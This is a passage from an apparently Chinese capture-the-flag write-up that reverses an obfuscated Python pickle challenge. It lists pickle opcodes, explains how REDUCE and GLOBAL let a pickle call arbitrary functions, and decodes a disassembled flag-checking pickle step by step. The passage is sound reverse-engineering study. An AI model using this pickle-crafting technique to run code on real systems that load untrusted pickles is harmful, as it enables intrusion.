<tr>
<td>BININT</td>
<td>&#x3D; b’J’</td>
<td># push four-byte signed int</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BININT1</td>
<td>&#x3D; b’K’</td>
<td># push 1-byte unsigned int</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>LONG</td>
<td>&#x3D; b’L’</td>
<td># push long; decimal string argument</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BININT2</td>
<td>&#x3D; b’M’</td>
<td># push 2-byte unsigned int</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>NONE</td>
<td>&#x3D; b’N’</td>
<td># push None</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>PERSID</td>
<td>&#x3D; b’P’</td>
<td># push persistent object; id is taken from string arg</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINPERSID</td>
<td>&#x3D; b’Q’</td>
<td>#</td>
<td>“</td>
<td>“</td>
<td>“</td>
<td>;</td>
<td>“</td>
<td>“</td>
<td>“</td>
<td>“</td>
<td>stack</td>
</tr>
<tr>
<td>REDUCE</td>
<td>&#x3D; b’R’</td>
<td># apply callable to argtuple, both on stack</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>STRING</td>
<td>&#x3D; b’S’</td>
<td># push string; NL-terminated string argument</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINSTRING</td>
<td>&#x3D; b’T’</td>
<td># push string; counted binary string argument</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>SHORT_BINSTRING&#x3D; b’U’</td>
<td>#</td>
<td>“</td>
<td>“</td>
<td>;</td>
<td>“</td>
<td>“</td>
<td>“</td>
<td>“ &lt; 256 bytes</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>UNICODE</td>
<td>&#x3D; b’V’</td>
<td># push Unicode string; raw-unicode-escaped’d argument</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINUNICODE</td>
<td>&#x3D; b’X’</td>
<td>#</td>
<td>“</td>
<td>“</td>
<td>“</td>
<td>; counted UTF-8 string argument</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>APPEND</td>
<td>&#x3D; b’a’</td>
<td># append stack top to list below it</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BUILD</td>
<td>&#x3D; b’b’</td>
<td># call <strong>setstate</strong> or <strong>dict</strong>.update()</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>GLOBAL</td>
<td>&#x3D; b’c’</td>
<td># push self.find_class(modname, name); 2 string args</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>DICT</td>
<td>&#x3D; b’d’</td>
<td># build a dict from stack items</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>EMPTY_DICT</td>
<td>&#x3D; b’}’</td>
<td># push empty dict</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>APPENDS</td>
<td>&#x3D; b’e’</td>
<td># extend list on stack by topmost stack slice</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>GET</td>
<td>&#x3D; b’g’</td>
<td># push item from memo on stack; index is string arg</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINGET</td>
<td>&#x3D; b’h’</td>
<td>#</td>
<td>“</td>
<td>“</td>
<td>“</td>
<td>“</td>
<td>“</td>
<td>“</td>
<td>;</td>
<td>“</td>
<td>“ 1-byte arg</td>
</tr>
<tr>
<td>INST</td>
<td>&#x3D; b’i’</td>
<td># build &amp; push class instance</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>LONG_BINGET</td>
<td>&#x3D; b’j’</td>
<td># push item from memo on stack; index is 4-byte arg</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>LIST</td>
<td>&#x3D; b’l’</td>
<td># build list from topmost stack items</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>EMPTY_LIST</td>
<td>&#x3D; b’]’</td>
<td># push empty list</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>OBJ</td>
<td>&#x3D; b’o’</td>
<td># build &amp; push class instance</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>PUT</td>
<td>&#x3D; b’p’</td>
<td># store stack top in memo; index is string arg</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINPUT</td>
<td>&#x3D; b’q’</td>
<td>#</td>
<td>“</td>
<td>“</td>
<td>“</td>
<td>“</td>
<td>“ ;</td>
<td>“</td>
<td>“ 1-byte arg</td>
<td></td>
<td></td>
</tr>
<tr>
<td>LONG_BINPUT</td>
<td>&#x3D; b’r’</td>
<td>#</td>
<td>“</td>
<td>“</td>
<td>“</td>
<td>“</td>
<td>“ ;</td>
<td>“</td>
<td>“ 4-byte arg</td>
<td></td>
<td></td>
</tr>
<tr>
<td>SETITEM</td>
<td>&#x3D; b’s’</td>
<td># add key+value pair to dict</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>TUPLE</td>
<td>&#x3D; b’t’</td>
<td># build tuple from topmost stack items</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>EMPTY_TUPLE</td>
<td>&#x3D; b’)’</td>
<td># push empty tuple</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>SETITEMS</td>
<td>&#x3D; b’u’</td>
<td># modify dict by adding topmost key+value pairs</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINFLOAT</td>
<td>&#x3D; b’G’</td>
<td># push float; arg is 8-byte float encoding</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>TRUE</td>
<td>&#x3D; b’I01\n’</td>
<td># not an opcode; see INT docs in pickletools.py</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>FALSE</td>
<td>&#x3D; b’I00\n’</td>
<td># not an opcode; see INT docs in pickletools.py</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td># Protocol 2</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>PROTO</td>
<td>&#x3D; b’\x80’</td>
<td># identify pickle protocol</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>NEWOBJ</td>
<td>&#x3D; b’\x81’</td>
<td># build object by applying cls.<strong>new</strong> to argtuple</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>EXT1</td>
<td>&#x3D; b’\x82’</td>
<td># push object from extension registry; 1-byte index</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>EXT2</td>
<td>&#x3D; b’\x83’</td>
<td># ditto, but 2-byte index</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>EXT4</td>
<td>&#x3D; b’\x84’</td>
<td># ditto, but 4-byte index</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>TUPLE1</td>
<td>&#x3D; b’\x85’</td>
<td># build 1-tuple from stack top</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>TUPLE2</td>
<td>&#x3D; b’\x86’</td>
<td># build 2-tuple from two topmost stack items</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>TUPLE3</td>
<td>&#x3D; b’\x87’</td>
<td># build 3-tuple from three topmost stack items</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>NEWTRUE</td>
<td>&#x3D; b’\x88’</td>
<td># push True</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>NEWFALSE</td>
<td>&#x3D; b’\x89’</td>
<td># push False</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>LONG1</td>
<td>&#x3D; b’\x8a’</td>
<td># push long from &lt; 256 bytes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>LONG4</td>
<td>&#x3D; b’\x8b’</td>
<td># push really big long</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>_tuplesize2code &#x3D; [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td># Protocol 3 (Python 3.x)</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINBYTES</td>
<td>&#x3D; b’B’</td>
<td># push bytes; counted binary string argument</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>SHORT_BINBYTES &#x3D; b’C’</td>
<td>#</td>
<td>“</td>
<td>“</td>
<td>;</td>
<td>“</td>
<td>“</td>
<td>“</td>
<td>“ &lt; 256 bytes</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td># Protocol 4</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>SHORT_BINUNICODE &#x3D; b’\x8c’</td>
<td># push short string; UTF-8 length &lt; 256 bytes</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINUNICODE8</td>
<td>&#x3D; b’\x8d’</td>
<td># push very long string</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BINBYTES8</td>
<td>&#x3D; b’\x8e’</td>
<td># push very long bytes string</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>EMPTY_SET</td>
<td>&#x3D; b’\x8f’</td>
<td># push empty set on the stack</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>ADDITEMS</td>
<td>&#x3D; b’\x90’</td>
<td># modify set by adding topmost stack items</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>FROZENSET</td>
<td>&#x3D; b’\x91’</td>
<td># build frozenset from topmost stack items</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>NEWOBJ_EX</td>
<td>&#x3D; b’\x92’</td>
<td># like NEWOBJ but work with keyword only arguments</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>STACK_GLOBAL</td>
<td>&#x3D; b’\x93’</td>
<td># same as GLOBAL but using names on the stacks</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>MEMOIZE</td>
<td>&#x3D; b’\x94’</td>
<td># store top of the stack in memo</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>FRAME</td>
<td>&#x3D; b’\x95’</td>
<td># indicate the beginning of a new frame</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td># Protocol 5</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>BYTEARRAY8</td>
<td>&#x3D; b’\x96’</td>
<td># push bytearray</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>NEXT_BUFFER</td>
<td>&#x3D; b’\x97’</td>
<td># push next out-of-band buffer</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>READONLY_BUFFER</td>
<td>&#x3D; b’\x98’</td>
<td># make top of stack readonly</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>结合此表可以看出<code>__reduce__()</code>漏洞实现的底层原理是这样的指令结构:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># MEMOIZE/GET/...            用以确保栈上一定有接下来REDUCE要使用的函数</span><br><span class="line">STACK_GLOBAL/GLOBAL            获取这个函数</span><br><span class="line">MARK</span><br><span class="line">    DATATYPE arg1</span><br><span class="line">    DATATYPE arg2</span><br><span class="line">    ...</span><br><span class="line">    TUPLE                    将参数正序入栈 若参数个数超过3个就会用这样的方式打包入栈 否则就会用TUPLEx直接入栈</span><br><span class="line">REDUCE                        已这些参数执行函数并将返回值以元组的方式打包放在栈顶</span><br></pre></td></tr></table></figure>

<p>有了这些基础知识再看这题 先用dis打印出可读性较高的指令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  0: \x80 PROTO      4</span><br><span class="line">  2: c    GLOBAL     &#x27;types FunctionType&#x27;</span><br><span class="line"> 22: (    MARK</span><br><span class="line"> 23: c        GLOBAL     &#x27;types CodeType&#x27;</span><br><span class="line"> 39: (        MARK</span><br><span class="line"> 40: I            INT        1</span><br><span class="line"> 43: I            INT        0</span><br><span class="line"> 46: I            INT        0</span><br><span class="line"> 49: I            INT        4</span><br><span class="line"> 52: I            INT        8</span><br><span class="line"> 55: I            INT        67</span><br><span class="line"> 59: C            SHORT_BINBYTES b&#x27;t\x00\xa0\x01|\x00d\x01\xa1\x02&#125;\x01t\x02|\x01\x83\x01d\x00d\x00d\x02\x85\x03\x19\x00d\x00d\x03\x85\x02\x19\x00&#125;\x00d\x04&#125;\x02t\x03d\x05t\x04|\x00\x83\x01d\x06\x83\x03D\x00]\x11&#125;\x03|\x02t\x05t\x00|\x00|\x03|\x03d\x06\x17\x00\x85\x02\x19\x00d\x07\x83\x02\x83\x017\x00&#125;\x02q\x1d|\x02S\x00&#x27;</span><br><span class="line">159: (            MARK</span><br><span class="line">160: N                NONE</span><br><span class="line">161: V                UNICODE    &#x27;big&#x27;</span><br><span class="line">166: I                INT        -1</span><br><span class="line">170: I                INT        -3</span><br><span class="line">174: V                UNICODE    &#x27;&#x27;</span><br><span class="line">176: I                INT        0</span><br><span class="line">179: I                INT        8</span><br><span class="line">182: I                INT        2</span><br><span class="line">185: t                TUPLE      (MARK at 159)</span><br><span class="line">186: (            MARK</span><br><span class="line">187: V                UNICODE    &#x27;int&#x27;</span><br><span class="line">192: V                UNICODE    &#x27;from_bytes&#x27;</span><br><span class="line">204: V                UNICODE    &#x27;bin&#x27;</span><br><span class="line">209: V                UNICODE    &#x27;range&#x27;</span><br><span class="line">216: V                UNICODE    &#x27;len&#x27;</span><br><span class="line">221: V                UNICODE    &#x27;chr&#x27;</span><br><span class="line">226: t                TUPLE      (MARK at 186)</span><br><span class="line">227: (            MARK</span><br><span class="line">228: \x8c             SHORT_BINUNICODE &#x27;🔥&#x27;</span><br><span class="line">234: \x8c             SHORT_BINUNICODE &#x27;🤫&#x27;</span><br><span class="line">240: \x8c             SHORT_BINUNICODE &#x27;🧏&#x27;</span><br><span class="line">246: \x8c             SHORT_BINUNICODE &#x27;🎵&#x27;</span><br><span class="line">252: t                TUPLE      (MARK at 227)</span><br><span class="line">253: V            UNICODE    &#x27;dill-with-it&#x27;</span><br><span class="line">267: \x8c         SHORT_BINUNICODE &#x27;📮&#x27;</span><br><span class="line">273: I            INT        0</span><br><span class="line">276: C            SHORT_BINBYTES b&#x27;\x00\x01\x0c\x01\x1a\x01\x04\x01\x14\x01 \x01&#x27;</span><br><span class="line">290: )            EMPTY_TUPLE</span><br><span class="line">291: )            EMPTY_TUPLE</span><br><span class="line">292: t            TUPLE      (MARK at 39)</span><br><span class="line">293: \x81     NEWOBJ</span><br><span class="line">294: c        GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="line">312: )        EMPTY_TUPLE</span><br><span class="line">313: R        REDUCE</span><br><span class="line">314: \x8c     SHORT_BINUNICODE &#x27;📮&#x27;</span><br><span class="line">320: t        TUPLE      (MARK at 22)</span><br><span class="line">321: \x81 NEWOBJ</span><br><span class="line">322: \x94 MEMOIZE    (as 0)</span><br><span class="line">323: 0    POP</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>一开始是先用<code>types.CodeType</code>和<code>types.FunctionType</code>来定义了一个函数并在MEMO中以赋以编号0 翻译为python代码大致为:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">code = types.CodeType(</span><br><span class="line">    <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">67</span>, <span class="string">b&#x27;t\x00\xa0\x01|\x00d\x01\xa1\x02&#125;\x01t\x02|\x01\x83\x01d\x00d\x00d\x02\x85\x03\x19\x00d\x00d\x03\x85\x02\x19\x00&#125;\x00d\x04&#125;\x02t\x03d\x05t\x04|\x00\x83\x01d\x06\x83\x03D\x00]\x11&#125;\x03|\x02t\x05t\x00|\x00|\x03|\x03d\x06\x17\x00\x85\x02\x19\x00d\x07\x83\x02\x83\x017\x00&#125;\x02q\x1d|\x02S\x00&#x27;</span>,</span><br><span class="line">    (<span class="literal">None</span>, <span class="string">&#x27;big&#x27;</span>, -<span class="number">1</span>, -<span class="number">3</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">2</span>),</span><br><span class="line">    (<span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;from_bytes&#x27;</span>, <span class="string">&#x27;bin&#x27;</span>, <span class="string">&#x27;range&#x27;</span>, <span class="string">&#x27;len&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;🔥&#x27;</span>, <span class="string">&#x27;🤫&#x27;</span>, <span class="string">&#x27;🧏&#x27;</span>, <span class="string">&#x27;🎵&#x27;</span>),</span><br><span class="line">    <span class="string">&#x27;dill-with-it&#x27;</span>, <span class="string">&#x27;📮&#x27;</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="string">b&#x27;\x00\x01\x0c\x01\x1a\x01\x04\x01\x14\x01 \x01&#x27;</span>,</span><br><span class="line">    (),</span><br><span class="line">    ()</span><br><span class="line">)</span><br><span class="line">func = types.FunctionType(code, <span class="built_in">globals</span>())</span><br></pre></td></tr></table></figure>

<p>其中的PYC字节码翻译为python代码含义大致为(用这种方式定义函数中使用别的函数时<code>LOAD_GLOBAL x</code>中的<code>x</code>就是要使用的函数在预备函数列表中的下标 在这里就是<code>(&#39;int&#39;, &#39;from_bytes&#39;, &#39;bin&#39;, &#39;range&#39;, &#39;len&#39;, &#39;chr&#39;)[x]</code>):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decodea</span>(<span class="params">arg</span>):</span><br><span class="line">    binstr = <span class="built_in">bin</span>(<span class="built_in">int</span>.from_bytes(arg, <span class="string">&quot;big&quot;</span>))[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binstr), <span class="number">8</span>):</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>(binstr[i:i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytearray</span>(result, <span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>再看下面的PVM字节码:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  324: g    GET        0</span><br><span class="line">  327: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  338: \x85 TUPLE1</span><br><span class="line">  339: R    REDUCE</span><br><span class="line">  340: g    GET        0</span><br><span class="line">  343: C    SHORT_BINBYTES b&#x27;\x01.\xce\x966&#x27;</span><br><span class="line">  350: \x85 TUPLE1</span><br><span class="line">  351: R    REDUCE</span><br><span class="line">  352: \x93 STACK_GLOBAL</span><br><span class="line">  353: g    GET        0</span><br><span class="line">  356: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  367: \x85 TUPLE1</span><br><span class="line">  368: R    REDUCE</span><br><span class="line">  369: g    GET        0</span><br><span class="line">  372: C    SHORT_BINBYTES b&#x27;\x01\xa6&amp;\xf6\xc6v\xa6tN.\xce&#x27;</span><br><span class="line">  385: \x85 TUPLE1</span><br><span class="line">  386: R    REDUCE</span><br><span class="line">  387: \x93 STACK_GLOBAL</span><br><span class="line">  388: g    GET        0</span><br><span class="line">  391: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  402: \x85 TUPLE1</span><br><span class="line">  403: R    REDUCE</span><br><span class="line">  404: g    GET        0</span><br><span class="line">  407: C    SHORT_BINBYTES b&#x27;\x01.v\x96N\x0e&#x27;</span><br><span class="line">  415: \x85 TUPLE1</span><br><span class="line">  416: R    REDUCE</span><br><span class="line">  417: \x93 STACK_GLOBAL</span><br><span class="line">  418: V    UNICODE    &quot;What&#x27;s the flag? &quot;</span><br><span class="line">  437: \x85 TUPLE1</span><br><span class="line">  438: R    REDUCE</span><br><span class="line">  439: 0    POP</span><br><span class="line">  440: g    GET        0</span><br><span class="line">  443: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  454: \x85 TUPLE1</span><br><span class="line">  455: R    REDUCE</span><br><span class="line">  456: g    GET        0</span><br><span class="line">  459: C    SHORT_BINBYTES b&#x27;\x01.\xae\x0ev\x96&#x27;</span><br><span class="line">  467: \x85 TUPLE1</span><br><span class="line">  468: R    REDUCE</span><br><span class="line">  469: \x93 STACK_GLOBAL</span><br><span class="line">  470: V    UNICODE    &#x27;&gt; &#x27;</span><br><span class="line">  474: \x85 TUPLE1</span><br><span class="line">  475: R    REDUCE</span><br><span class="line">  476: \x85 TUPLE1</span><br><span class="line">  477: R    REDUCE</span><br><span class="line">  478: \x85 TUPLE1</span><br><span class="line">  479: R    REDUCE</span><br><span class="line">  480: \x94 MEMOIZE    (as 1)</span><br><span class="line">  481: 0    POP</span><br><span class="line">  482: g    GET        0</span><br><span class="line">  485: C    SHORT_BINBYTES b&#x27;\x01\xb6\xf6&amp;v\x86N&#x27;</span><br><span class="line">  494: \x85 TUPLE1</span><br><span class="line">  495: R    REDUCE</span><br><span class="line">  496: g    GET        0</span><br><span class="line">  499: C    SHORT_BINBYTES b&#x27;\x01&amp;\xa6\xa6\xce&#x27;</span><br><span class="line">  506: \x85 TUPLE1</span><br><span class="line">  507: R    REDUCE</span><br><span class="line">  508: \x93 STACK_GLOBAL</span><br><span class="line">  509: V    UNICODE    &#x27;five nights as freddy&#x27;</span><br><span class="line">  532: \x85 TUPLE1</span><br><span class="line">  533: R    REDUCE</span><br><span class="line">  534: 0    POP</span><br><span class="line">  535: g    GET        0</span><br><span class="line">  538: C    SHORT_BINBYTES b&#x27;\x01\xb6\xf6&amp;v\x86N&#x27;</span><br><span class="line">  547: \x85 TUPLE1</span><br><span class="line">  548: R    REDUCE</span><br><span class="line">  549: g    GET        0</span><br><span class="line">  552: C    SHORT_BINBYTES b&#x27;\x01\xa66ff\xae\x16\xce&#x27;</span><br><span class="line">  562: \x85 TUPLE1</span><br><span class="line">  563: R    REDUCE</span><br><span class="line">  564: \x93 STACK_GLOBAL</span><br><span class="line">  565: g    GET        1</span><br><span class="line">  568: \x85 TUPLE1</span><br><span class="line">  569: R    REDUCE</span><br><span class="line">  570: 0    POP</span><br><span class="line">  571: g    GET        0</span><br><span class="line">  574: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  585: \x85 TUPLE1</span><br><span class="line">  586: R    REDUCE</span><br><span class="line">  587: g    GET        0</span><br><span class="line">  590: C    SHORT_BINBYTES b&#x27;\x01.\xce\x966&#x27;</span><br><span class="line">  597: \x85 TUPLE1</span><br><span class="line">  598: R    REDUCE</span><br><span class="line">  599: \x93 STACK_GLOBAL</span><br><span class="line">  600: g    GET        0</span><br><span class="line">  603: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  614: \x85 TUPLE1</span><br><span class="line">  615: R    REDUCE</span><br><span class="line">  616: g    GET        0</span><br><span class="line">  619: C    SHORT_BINBYTES b&#x27;\x01\x0e\x86\xb6&#x27;</span><br><span class="line">  625: \x85 TUPLE1</span><br><span class="line">  626: R    REDUCE</span><br><span class="line">  627: \x93 STACK_GLOBAL</span><br><span class="line">  628: g    GET        0</span><br><span class="line">  631: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  642: \x85 TUPLE1</span><br><span class="line">  643: R    REDUCE</span><br><span class="line">  644: g    GET        0</span><br><span class="line">  647: C    SHORT_BINBYTES b&#x27;\x01\xfa\xfaN\xf6\x1e\xfa\xfat.v\x96&#x27;</span><br><span class="line">  661: \x85 TUPLE1</span><br><span class="line">  662: R    REDUCE</span><br><span class="line">  663: \x93 STACK_GLOBAL</span><br><span class="line">  664: g    GET        0</span><br><span class="line">  667: C    SHORT_BINBYTES b&#x27;\x01\xb6\xf6&amp;v\x86N&#x27;</span><br><span class="line">  676: \x85 TUPLE1</span><br><span class="line">  677: R    REDUCE</span><br><span class="line">  678: g    GET        0</span><br><span class="line">  681: C    SHORT_BINBYTES b&#x27;\x01\xce\xa6.\x9eF&amp;v\x86N&#x27;</span><br><span class="line">  693: \x85 TUPLE1</span><br><span class="line">  694: R    REDUCE</span><br><span class="line">  695: \x93 STACK_GLOBAL</span><br><span class="line">  696: g    GET        0</span><br><span class="line">  699: C    SHORT_BINBYTES b&#x27;\x01\xcev\x96.6\x96\xaeF&#x27;</span><br><span class="line">  710: \x85 TUPLE1</span><br><span class="line">  711: R    REDUCE</span><br><span class="line">  712: g    GET        0</span><br><span class="line">  715: C    SHORT_BINBYTES b&#x27;\x01v\xa66&#x27;</span><br><span class="line">  721: \x85 TUPLE1</span><br><span class="line">  722: R    REDUCE</span><br><span class="line">  723: \x93 STACK_GLOBAL</span><br><span class="line">  724: g    GET        1</span><br><span class="line">  727: \x85 TUPLE1</span><br><span class="line">  728: 